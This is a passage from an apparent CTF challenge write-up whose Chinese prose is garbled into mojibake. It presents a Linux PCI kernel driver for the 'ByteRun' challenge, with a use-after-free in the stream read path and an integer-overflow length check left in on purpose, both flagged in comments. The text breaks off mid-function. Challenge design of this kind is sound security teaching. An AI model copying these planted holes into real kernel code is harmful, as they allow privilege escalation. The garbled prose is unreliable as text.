æ¼æ´</li><li>QEMU éƒ¨åˆ†åˆ™ä¸»è¦æ˜¯ä¸€ä¸ªæä¾›å­˜å‚¨åŠŸèƒ½çš„â€œå—è®¾å¤‡â€ï¼Œæ¼æ´åˆ™æ˜¯éå¸¸æ˜æ˜¾çš„æ•´æ•°æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œè¯»å†™</li></ul><p>åœ¨ç¬”è€…çœ‹æ¥æ•´ä½“éš¾åº¦å…¶å®å¹¶ä¸ç®—å¤ªå¤§ï¼ˆå› ä¸ºå½“ç¬”è€…å¼€å§‹å‡ºè¿™é“é¢˜ç›®çš„æ—¶å€™å‡ºé¢˜æ—¶é—´å·²ç»æ‰€å‰©æ— å‡ äº†ï¼Œé‚£æ—¶å€™å…¶å®æ²¡æƒ³å‡ºå•¥å¥½çš„ç‚¹å­XDï¼‰ï¼Œæ‰€ä»¥åœ¨å…¶ä»–å‡ºé¢˜äººéƒ½åœ¨æ–‡æ¡£é‡Œå†™â€œéš¾åº¦ä¸­ç­‰â€çš„æ—¶å€™åªæœ‰ç¬”è€…ä¸€ä¸ªäººå†™äº†â€œéš¾åº¦ç®€å•â€ï¼Œä»æœ€ç»ˆçš„è§£é¢˜æƒ…å†µæ¥çœ‹çš„è¯ <em>è¿™ä¸€æ¬¡æ•´ä¸ª pwn çš„å‡ºé¢˜å¥½åƒéƒ½ä¸å’‹èƒ½å¸å¼•å¤§ä½¬æ¥åšâ€¦â€¦</em></p><p>æœ¬æ¬¡é¢˜ç›®æºç å·²ç»å…¨éƒ¨å¼€æºï¼š<a href="https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun">https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun</a></p><h1 id="0x01-é¢˜ç›®åˆ†æ"><a href="#0x01-é¢˜ç›®åˆ†æ" class="headerlink" title="0x01.é¢˜ç›®åˆ†æ"></a>0x01.é¢˜ç›®åˆ†æ</h1><p>u1s1ï¼Œè¿™ä¸€æ¬¡ç¼–è¯‘å‡ºæ¥çš„ä»£ç å†åæ±‡ç¼–ä¹‹åç¡®å®æ¯”è¾ƒéš¾çœ‹ï¼Œå“ªæ€•æ˜¯ç¬”è€…ä½œä¸ºå‡ºé¢˜äººå°è¯•é€†äº†ä¸€ä¸‹ä¹Ÿæ²¡èƒ½åœ¨çŸ­æ—¶é—´å†…çœ‹æ˜ç™½æ•´ä¸ªé¢˜ç›®çš„è¿è¡Œé€»è¾‘ï¼ˆç¬‘ï¼‰</p><h2 id="ä¸€ã€å†…æ ¸æ¨¡å—éƒ¨åˆ†"><a href="#ä¸€ã€å†…æ ¸æ¨¡å—éƒ¨åˆ†" class="headerlink" title="ä¸€ã€å†…æ ¸æ¨¡å—éƒ¨åˆ†"></a>ä¸€ã€å†…æ ¸æ¨¡å—éƒ¨åˆ†</h2><p>ç¬”è€…ä¸€å¼€å§‹å°±æƒ³å†™ä¸€ä¸ªåŠŸèƒ½ä¸Šæ¯”è¾ƒå®Œæ•´çš„è®¾å¤‡é©±åŠ¨ï¼Œäºæ˜¯åŒ…æ‹¬ä¸è®¾å¤‡äº¤äº’é‚£ä¸€å—çš„ä»£ç ä¹Ÿé›†æˆåœ¨äº†å†…æ ¸æ¨¡å—ä¸­ï¼Œä¸è¿‡åœ¨è¿™é‡Œç¬”è€…è®¾å®šäº†é©±åŠ¨å­˜åœ¨ç€ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼šæµï¼ˆstreamï¼‰æ¨¡å¼å’Œå—ï¼ˆblockï¼‰æ¨¡å¼ï¼Œå…¶ä¸­å‰è€…æ˜¯ä¸è®¾å¤‡æ— å…³çš„ç®¡é“åŠŸèƒ½éƒ¨åˆ†ï¼Œåè€…åˆ™æ˜¯ä¸è®¾å¤‡äº¤äº’çš„éƒ¨åˆ†ï¼Œä½†æ˜¯åè€…çš„åŠŸèƒ½éœ€è¦ root æƒé™æ‰èƒ½å¼€å¯ï¼Œäºæ˜¯ç¬¬ä¸€ä¸ªä»»åŠ¡å°±æ˜¯å†…æ ¸ææƒï¼›ï¼‰</p><p>åœ¨æ¨¡å—åˆå§‹åŒ–å‡½æ•°å½“ä¸­ä¸º PCI è®¾å¤‡è¿›è¡Œäº†ç›¸åº”çš„æ¥å£æ³¨å†Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">bytedev_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">/* register pci driver */</span><br>    <span class="hljs-keyword">return</span> pci_register_driver(&amp;bytedev_driver);<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªæ–°çš„ bytedev è®¾å¤‡æ’è¿›æ¥çš„æ—¶å€™ï¼Œå†…æ ¸ä¾¿ä¼šéå†æ¥å£æ¯”å¯¹ BTFï¼Œæœ€åè°ƒç”¨åˆ°æˆ‘ä»¬çš„åˆå§‹åŒ–å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> <span class="hljs-title">bytedev_ids</span>[] =</span> &#123;<br>    &#123; PCI_DEVICE(PCI_VENDOR_ID_BYTEDEV, PCI_DEVICE_ID_BYTEDEV) &#125;,<br>    &#123; <span class="hljs-number">0</span>, &#125;,<br>&#125;;<br><br>MODULE_DEVICE_TABLE(pci, bytedev_ids);<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> <span class="hljs-title">bytedev_driver</span> =</span> &#123;<br>    .name       = <span class="hljs-string">&quot;bytedev&quot;</span>,<br>    .id_table   = bytedev_ids,<br>    .probe      = bytedev_pci_probe,<br>    .remove     = bytedev_pci_remove,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºæ¯ä¸ªæ’ä¸Šæ¥çš„ bytedev ç±»å‹çš„è®¾å¤‡ï¼Œé©±åŠ¨éƒ½ä¼šåŠ¨æ€ç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„ç»“æ„ <code>bytedev</code>ï¼Œå¹¶ä½¿ç”¨ <code>pci_request_regions()</code> ç­‰å‡½æ•°è¿›è¡Œèµ„æºçš„æ¢æµ‹ä¸å ç”¨ï¼Œä»è€Œä½¿å¾—<strong>æ— æ³•ç›´æ¥é€šè¿‡åœ¨ç”¨æˆ·æ€è¿›ç¨‹æ‰“å¼€è®¾å¤‡èµ„æºæ–‡ä»¶çš„æ–¹å¼ä¸è®¾å¤‡è¿›è¡Œäº¤äº’</strong>ï¼š</p><blockquote><p>å…¶å®å¯ä»¥é€šè¿‡ææƒåå¸è½½å†…æ ¸æ¨¡å—çš„æ–¹å¼æ¥é‡æ–°å®ç°ç›´æ¥é€šè¿‡è®¾å¤‡èµ„æºæ–‡ä»¶ä¸è®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œä½†å®é™…ä¸Šåœ¨å†…æ ¸æ¨¡å—å½“ä¸­ç¬”è€…æ—©å·²å°è£…å¥½äº†æ‰€éœ€è¦ä½¿ç”¨çš„æ¥å£ï¼ˆç¬‘ï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_pci_probe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pci_dev *pdev,</span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">bdev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-type">char</span> dname[BYTEDEV_DEVNAME_LENGTH];<br>    <span class="hljs-type">int</span> minor_num;<br>    <span class="hljs-type">int</span> err;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] ByteDance pci device detected!&quot;</span>);<br><br>    <span class="hljs-comment">/* alloc space for bytedev struct*/</span><br>    <span class="hljs-keyword">if</span> (!(bdev = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev), GFP_KERNEL))) &#123;<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_no_mem;<br>    &#125;<br><br>    pci_set_drvdata(pdev, bdev);<br><br>    <span class="hljs-comment">/* enable the device */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_enable_device(pdev))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Cannot enable PCI device, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_free_dev;<br>&#125;<br><br>    <span class="hljs-comment">/* check for MMIO flags on BAR 0 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">0</span>) &amp; IORESOURCE_MEM)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for MMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for PMIO flags on BAR 1 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">1</span>) &amp; IORESOURCE_IO)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for PMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* request for PCI bar spaces */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_request_regions(pdev, DRV_NAME))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot obtain PCI resources, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* iomap for mmio space */</span><br>    bdev-&gt;mmio_addr = pci_ioremap_bar(pdev, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!bdev-&gt;mmio_addr) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot ioremap for MMIO space, abort.&quot;</span>);<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_out_free_region;<br>    &#125;<br><br>    <span class="hljs-comment">/* get I/O ports base */</span><br>    bdev-&gt;io_base = pci_resource_start(pdev, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* register device node */</span><br>    minor_num = bytedev_get_unused_minor_num();<br><br>    <span class="hljs-keyword">if</span> (minor_num &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] bytedev amount limits!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_iounmap_mmio;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (minor_num == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s&quot;</span>, DEVICE_NAME);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s%d&quot;</span>, DEVICE_NAME, minor_num);<br>    &#125;<br><br>    dev_node = device_create(bytedev_class, <span class="hljs-literal">NULL</span>, <br>                            MKDEV(bytedev_major_num, minor_num), <br>                            <span class="hljs-literal">NULL</span>, dname);<br>    <span class="hljs-keyword">if</span> (IS_ERR(dev_node)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Failed to create the device!&quot;</span>);<br>        err = PTR_ERR(dev_node);<br>        <span class="hljs-keyword">goto</span> err_out_unuse_minor;<br>    &#125;<br><br>    <span class="hljs-comment">/* other data init */</span><br>    spin_lock_init(&amp;bdev-&gt;dev_lock);<br>    <span class="hljs-built_in">memset</span>(bdev-&gt;data_queue, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) * BYTEDEV_MAX_BUFS);<br>    bdev-&gt;head_idx = <span class="hljs-number">0</span>;<br>    bdev-&gt;tail_idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* info records */</span><br>    bdev-&gt;pdev = pdev;<br>    bdev-&gt;dev_node = dev_node;<br>    bdev-&gt;minor_num = minor_num;<br>    bytedev_arr[minor_num] = bdev;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] bytedev%d register complete.&quot;</span>, minor_num);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_out_unuse_minor:<br>    bytedev_set_unused_minor_num(minor_num);<br>err_out_iounmap_mmio:<br>    pci_iounmap(pdev, bdev-&gt;mmio_addr);<br>err_out_free_region:<br>    pci_release_regions(pdev);<br>err_out_disable_pdev:<br>    pci_disable_device(pdev);<br>err_out_free_dev:<br>    kfree(bdev);<br>err_no_mem:<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>bytedev</code> ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dev</span>  *<span class="hljs-title">pdev</span>;</span><br>    <span class="hljs-type">int</span> minor_num;<br>    u64 __iomem  *mmio_addr;<br>    u64 io_base;<br><br>    <span class="hljs-type">spinlock_t</span> dev_lock;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">data_queue</span>[<span class="hljs-title">BYTEDEV_MAX_BUFS</span>];</span><br>    <span class="hljs-type">int</span> head_idx, tail_idx;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºæµæ¨¡å¼è€Œè¨€ï¼Œå…¶ä½¿ç”¨ä¸€ä¸ªç¯å½¢é˜Ÿåˆ— <code>data_queue</code> æ¥å®ç°è¿›ç¨‹é—´çš„æ•°æ®ä¼ é€’ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡è¯»å†™è®¾å¤‡æ–‡ä»¶æ¥å®ç°å¯¹ç¯å½¢é˜Ÿåˆ—çš„æ•°æ®è¯»å†™ï¼Œå…¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¦‚ä¸‹ç»“æ„çš„æŒ‡é’ˆæ•°ç»„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ¼æ´ä¾¿å­˜åœ¨äºè¯»çš„è¿‡ç¨‹å½“ä¸­ï¼Œåœ¨è¯»çš„è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€ä¸ª UAF æ¼æ´ï¼Œä»è€Œå¯¼è‡´è¯»å–å®Œæ•°æ®åå¯¹åº”çš„ buffer å¹¶æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œä½†æ˜¯åœ¨æ­£å¸¸åœ°å¯¹è¯¥åŠŸèƒ½çš„ä½¿ç”¨ä¸Šå¹¶ä¸ä¼šé€ æˆå½±å“ï¼Œå› ä¸º slub allocator å¹¶ä¸ä¼¼ ptmalloc é‚£æ ·æ’å®šä½¿ç”¨å‰ 8 å­—èŠ‚æ¥å­˜æ”¾ next free objectï¼Œè¿™ä½¿å¾—å…¶ç»Ÿè®¡æ•°æ®å­—æ®µå¾—ä»¥ä¿ç•™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> rlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already empty,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>            ret = rlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        d = dev-&gt;data_queue[dev-&gt;head_idx];<br>        left = d-&gt;len - d-&gt;offset;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_to_user(buf + rlen, &amp;d-&gt;data[d-&gt;offset], clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while reading the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;offset += clen;<br>        rlen += clen;<br><br>        <span class="hljs-keyword">if</span> (d-&gt;offset == d-&gt;len) &#123;<br>            <span class="hljs-keyword">if</span> (d-&gt;len == BYTEDEV_BUF_SIZE) &#123;<br>                kfree(d);<br>                <span class="hljs-comment">/* ther&#x27;s where we made our basic bug: a UAF */</span><br>                <span class="hljs-comment">//dev-&gt;data_queue[dev-&gt;head_idx] = NULL;</span><br>                dev-&gt;head_idx++;<br>                dev-&gt;head_idx %= BYTEDEV_MAX_BUFS;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ret = rlen;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    ret = rlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªæ¼æ´åˆ™å­˜åœ¨äºå†™çš„è¿‡ç¨‹å½“ä¸­ï¼Œåœ¨å¯¹ç»Ÿè®¡æ•°æ®å­—æ®µçš„åˆ¤å®šå½“ä¸­å­˜åœ¨ä¸€ä¸ªæ•´å‹æº¢å‡ºæ¼æ´ï¼Œè‹¥æ˜¯æ­£å¸¸ä½¿ç”¨åˆ™ä»ä¸ä¼šè§¦å‘è¿™ä¸ªæ¼æ´ï¼Œä½†è‹¥æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ä¿®æ”¹å…¶ä¸ºä¸€ä¸ªè¾ƒå¤§çš„å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©å†…æ ¸æ¨¡å—è®¤ä¸ºè¯¥ buffer ä¾ç„¶æœ‰å¯ä»¥å†™å…¥çš„ç©ºé—´ï¼Œä»è€Œå®Œæˆè¶Šç•Œå†™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_queue_last_empty</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bytedev *dev)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx = (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br><br>    <span class="hljs-keyword">if</span> (!dev-&gt;data_queue[idx]) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* there&#x27;s where we made our expand bug: integer overflow */</span><br>    <span class="hljs-keyword">return</span> (BYTEDEV_BUF_SIZE - dev-&gt;data_queue[idx]-&gt;len) &gt; <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* the correct version */</span><br>    <span class="hljs-comment">//return dev-&gt;data_queue[idx]-&gt;len &lt; BYTEDEV_BUF_SIZE;</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> wlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br>        <span class="hljs-type">int</span> d_idx;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already 